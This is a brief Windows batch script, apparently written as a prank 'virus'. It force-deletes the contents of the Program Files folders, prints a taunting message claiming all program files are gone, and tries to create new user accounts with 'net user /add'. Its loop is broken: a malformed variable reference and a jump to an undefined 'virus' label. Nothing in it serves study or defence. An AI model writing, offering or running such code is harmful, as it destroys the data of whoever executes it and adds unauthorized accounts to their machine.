@echo off
:programfilesaredead
del /f /q "C:\Program Files"
del /f /q "C:\Program Files (x86)"
echo Ha! I deleted all your progarm files! Continue.
set /a _programfilesaredead+=1
net user %_programfilesaredead+% /add
goto virus
